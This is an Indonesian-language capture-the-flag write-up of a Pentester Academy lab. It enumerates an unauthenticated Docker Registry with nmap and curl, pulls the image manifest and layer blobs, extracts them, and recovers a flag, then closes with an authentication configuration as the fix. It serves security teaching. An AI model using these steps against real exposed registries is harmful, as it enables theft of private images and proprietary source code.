# Insecure Docker Registry

## Apa itu docker registry

Docker registry merupakan sebuah aplikasi yang digunakan untuk menyimpan container image. Docker registry biasanya dideploy diatas docker engine sendiri atau sebagai container. 

Banyak sekali perusahaan memanfaatkan registry secara public untuk mempermudah pekerjaan mereka bahkan kalau kalian melakukan pencarian menggunakan mesin sodan, kalian bisa menemukan banyak sekali image registry yang terekspose ke internet. Tentu tidak semua image registry tersebut bisa kita eksploitasi dengan mudah. Sekarang saya akan membahas sebuah lab yang disediakan oleh pentester academy.

## Environment Lab

- docker registry : 192.111.246.3  
- attacker : 192.111.246.2

## Gather Information

Scan target menggunakan nmap, because why not :)
```
root@attackdefense:~# nmap -p- -sV 192.111.246.3
Starting Nmap 7.70 ( https://nmap.org ) at 2020-10-01 03:09 UTC
Nmap scan report for target-1 (192.111.246.3)
Host is up (0.000014s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE VERSION
5000/tcp open  http    Docker Registry (API: 2.0)
MAC Address: 02:42:C0:6F:F6:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.14 seconds
```

Dari hasil scaning didapatkan port `5000` dengan tipe service `http`, version `Docker Registry (API: 2.0)`.

Kemudian kita coba interaksi ke API registry menggunakan `curl`.
```
root@attackdefense:~# curl http://192.111.246.3:5000/v2/_catalog
{"repositories":["treasure-trove"]}
```

Dari sini kita medapatkan bahwa registry terbuka tanpa perlu authentikasi.

## Extract container images

Dari informasi yang kita dapatkan, kita coba extract image `treasure-trove`. Terlebih dahulu list tags dari image tersebut untuk memastikan apabila ada image dengan tags lain yang mungkin lebih menarik.

```
root@attackdefense:~# curl http://192.111.246.3:5000/v2/treasure-trove/tags/list
{"name":"treasure-trove","tags":["latest"]}
```
Ternyata hanya ada tag latest. Kemudian kita extract manifest dari image tersebut.

```
root@attackdefense:~# curl http://192.111.246.3:5000/v2/treasure-trove/manifests/latest
{
   "schemaVersion": 1,
   "name": "treasure-trove",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:2a62ecb2a3e5bcdbac8b6edc58fae093a39381e05d08ca75ed27cae94125f935"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:e7c96db7181be991f19a9fb6975cdbbd73c65f4a2681348e63a141a2192a5f10"
      }
   ],
```

Dari informasi blobSum ini kita bisa download image tersebut.

```
root@attackdefense:~# curl -s http://192.111.246.3:5000/v2/treasure-trove/blobs/sha256:2a62ecb2a3e5bcdbac8b6edc58fae093a39381e05d08ca75ed27cae94125f935 --output 1.tar
root@attackdefense:~# curl -s http://192.111.246.3:5000/v2/treasure-trove/blobs/sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 --output 2.tar
root@attackdefense:~# curl -s http://192.111.246.3:5000/v2/treasure-trove/blobs/sha256:e7c96db7181be991f19a9fb6975cdbbd73c65f4a2681348e63a141a2192a5f10 --output 3.tar
root@attackdefense:~# ls
1.tar  2.tar  3.tar
```

Extract image yang sudah didownload.

```
root@attackdefense:~# mkdir image
root@attackdefense:~# mv *.tar image
root@attackdefense:~# cd image/
root@attackdefense:~/image# for i in 1 2 3; do tar -xf $i.tar; done
root@attackdefense:~/image# ls
1.tar  2.tar  3.tar  bin  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@attackdefense:~/image#
```

## Find the flag

```
root@attackdefense:~/image# find . -name *flag* 2> /dev/null
./etc/network/if-post-up.d/flag.txt
root@attackdefense:~/image# cat etc/network/if-post-up.d/flag.txt
c09f6e2ecff56dcae50c02c6a4d355fe
root@attackdefense:~/image#
```

OK flag sudah ketemu..

Untuk real casenya kalian bisa mendapatkan source code aplikasi yang merupakan proprietary suatu organisasi.

## Penanganan

Kalian bisa mengaplikasikan authentikasi di docker registry kalian.
```
  token:
    realm: token-realm
    service: token-service
    issuer: registry-token-issuer
    rootcertbundle: /root/certs/bundle
  htpasswd:
    realm: basic-realm
    path: /path/to/htpasswd
```
`source :` https://docs.docker.com/registry/configuration/#auth